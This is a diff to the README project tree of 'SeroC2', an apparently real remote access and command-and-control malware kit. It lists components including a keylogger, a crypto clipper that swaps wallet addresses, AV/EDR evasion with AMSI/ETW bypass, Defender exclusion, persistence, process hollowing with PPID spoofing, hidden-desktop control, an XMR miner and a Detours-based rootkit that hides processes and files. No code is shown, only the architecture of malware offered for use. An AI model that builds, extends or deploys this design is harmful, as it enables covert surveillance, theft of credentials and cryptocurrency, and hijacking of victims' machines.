@@ -450,10 +450,10 @@ Then tick **UPX compression** in the Builder before clicking Build. The `tools/`
 ```
 SeroC2/
 ├── server/                        # C2 Server (WPF · .NET 10)
-│   ├── UI/                        # Windows
+│   ├── UI/                        # Windows + helpers
 │   │   ├── ServerWindow.*         # Main dashboard + builder
-│   │   ├── RemoteDesktopWindow.*  # RDP viewer
-│   │   ├── HvncWindow.*           # HVNC viewer
+│   │   ├── RemoteDesktopWindow.*  # RDP viewer (JPEG blocks + H264 stream)
+│   │   ├── HvncWindow.*           # HVNC viewer (JPEG + H264 stream)
 │   │   ├── WebcamWindow.*         # Webcam viewer
 │   │   ├── RemoteShellWindow.*    # Interactive shell
 │   │   ├── FileManagerWindow.*    # Remote file browser
@@ -463,9 +463,33 @@ SeroC2/
 │   │   ├── FunWindow.*            # Fun / prank controls
 │   │   ├── KeyloggerWindow.*      # Keylogger viewer
 │   │   ├── CryptoClipperWindow.*  # Crypto clipper config + detection log
-│   │   └── ClientLogWindow.*      # Per-client activity log
+│   │   ├── ProcessManagerWindow.* # Process enumeration + kill
+│   │   ├── ServiceManagerWindow.* # Windows services manager
+│   │   ├── DeviceManagerWindow.*  # Hardware device manager
+│   │   ├── RegistryEditorWindow.* # Remote registry editor
+│   │   ├── InstalledAppsWindow.*  # Installed programs + uninstall
+│   │   ├── WindowManagerWindow.*  # Window enumeration + control
+│   │   ├── Socks5Window.*         # SOCKS5 reverse proxy viewer
+│   │   ├── TikTokWindow.*         # TikTok comment + livestream feature
+│   │   ├── MinerStatsWindow.*     # XMR miner live stats
+│   │   ├── PerformanceMonitorWindow.* # CPU / RAM / GPU performance monitor
+│   │   ├── ClientLogWindow.*      # Per-client activity log
+│   │   ├── NotificationPopup.*    # Desktop notification overlay
+│   │   ├── WebcamLayoutDialog.*   # Multi-webcam layout picker
+│   │   ├── CustomAutoTaskDialog.* # Custom auto-task configuration
+│   │   ├── TagDialog.*            # Client tag / label editor
+│   │   ├── ConfirmDialog.*        # Generic confirm dialog
+│   │   ├── AddKeywordDialog.*     # Window-notify keyword editor
+│   │   ├── NotificationService.cs # Notification dispatch service
+│   │   ├── FeatureContextMenu.cs  # Right-click context menu for client grid
+│   │   ├── RubberBandSelector.cs  # Rubber-band multi-select for client grid
+│   │   ├── Lang.cs                # Multi-language string table
+│   │   ├── UiPrefs.cs             # UI preferences persistence
+│   │   ├── FlagCache.cs           # Country flag icon cache
+│   │   ├── ShellIcon.cs           # Shell icon extraction helper
+│   │   └── WindowResizer.cs       # Borderless window resize helper
 │   ├── Builder/                   # Build pipeline (config gen, NativeAOT, crypter bridge)
-│   ├── Net/                       # TLS server + certificate + Discord RPC
+│   ├── Net/                       # TLS server · H264Decoder · Discord RPC · miner stats host
 │   ├── Data/                      # JSON datastore, client records, autotask queue
 │   ├── Protocol/                  # Packet protocol + all data classes
 │   └── SeroServer.csproj
@@ -474,13 +498,15 @@ SeroC2/
 │   ├── Program.cs                 # Entry point + protection init
 │   ├── TlsClient.cs               # TLS client + full command dispatch
 │   ├── Protection.cs              # Anti-analysis + guardian watchdog + Defender exclusion (registry P/Invoke)
+│   ├── EvasionBypass.cs           # AV/EDR evasion + AMSI/ETW bypass
 │   ├── Persistence.cs             # Registry + Startup + Task + file watchdog
 │   ├── TelegramNotifier.cs        # First-exec Telegram notification
-│   ├── RemoteDesktopFeature.cs    # DXGI + GDI BitBlt, 64×64 block diff
+│   ├── RemoteDesktopFeature.cs    # DXGI + GDI BitBlt, 64×64 block diff + H264 stream
 │   ├── DxgiCapture.cs             # DXGI Desktop Duplication
+│   ├── H264Encoder.cs             # H264 encoder via MF COM vtable (NativeAOT, no DllImport)
 │   ├── WebcamFeature.cs           # DirectShow SampleGrabber
 │   ├── WebcamDShow.cs             # VFW avicap32 fallback
-│   ├── HvncFeature.cs             # Hidden virtual desktop
+│   ├── HvncFeature.cs             # Hidden virtual desktop + H264 stream
 │   ├── FileManagerFeature.cs      # Remote file system operations
 │   ├── TcpManagerFeature.cs       # TCP table + force-close
 │   ├── StartupManagerFeature.cs   # Startup enumeration + deletion
@@ -488,11 +514,19 @@ SeroC2/
 │   ├── FunFeature.cs              # Fun commands (TTS, msgbox, screen, etc.)
 │   ├── KeyloggerFeature.cs        # WH_KEYBOARD_LL hook, offline disk logging (by date)
 │   ├── CryptoClipperFeature.cs    # Clipboard monitoring + crypto address swap
-│   ├── ProcessManagerFeature.cs   # Process enumeration + kill
+│   ├── ScreenshotFeature.cs       # On-demand screenshot capture
+│   ├── ProcessManagerFeature.cs   # Process enumeration + kill + suspend/resume
+│   ├── ServiceManagerFeature.cs   # Windows services enumeration + control
+│   ├── DeviceManagerFeature.cs    # Hardware device enumeration + enable/disable
+│   ├── RegistryEditorFeature.cs   # Remote registry read/write/delete
+│   ├── InstalledAppsFeature.cs    # Installed programs enumeration + uninstall
+│   ├── WindowManagerFeature.cs    # Window enumeration + show/hide/close/title
 │   ├── TikTokFeature.cs           # TikTok comment API (video + livestream)
 │   ├── TikTokCdpFeature.cs        # Chrome DevTools Protocol auto-signup (no HVNC, minimal TCP WS)
 │   ├── Socks5Feature.cs           # Reverse SOCKS5 relay
 │   ├── ProcessHollowing.cs        # RunPE + PPID spoofing
+│   ├── StubLog.cs                 # Stub-side structured logging
+│   ├── StubIconHelper.cs          # Stub icon + metadata utilities
 │   ├── Config.cs                  # ⚠️ AUTO-GENERATED by builder (no secrets in repo)
 │   └── SeroStub.csproj
 │
@@ -502,12 +536,18 @@ SeroC2/
 │   └── MinerStub.csproj
 │
 ├── miner-uninstaller/             # Silent miner removal utility
-├── stats-server/                  # Lightweight HTTP stats dashboard
+│   ├── Program.cs                 # Uninstaller entry point
+│   ├── UninstallerConfig.cs       # ⚠️ AUTO-GENERATED by builder
+│   └── MinerUninstaller.csproj
 │
 ├── hook/                          # User-mode rootkit (Microsoft Detours)
+│   ├── Detours/                   # Microsoft Detours library (vendored)
 │   └── hook/
-│       ├── dllmain.cpp            # NtQuerySystemInformation, NtQueryDirectoryFile hooks
-│       └── ReflectiveDllMain.cpp  # Reflective PE loader (PEB walk, no imports)
+│       └── hook/
+│           ├── dllmain.cpp        # NtQuerySystemInformation, NtQueryDirectoryFile hooks
+│           ├── ReflectiveDllMain.cpp # Reflective PE loader (PEB walk, no imports)
+│           ├── ntstructs.h        # NT internal structures
+│           └── hook.vcxproj
 │
 ├── setup.bat                      # Prerequisite installer (run as Admin)
 ├── setup-prerequisites.ps1        # winget automation (.NET SDK + VS Build Tools)
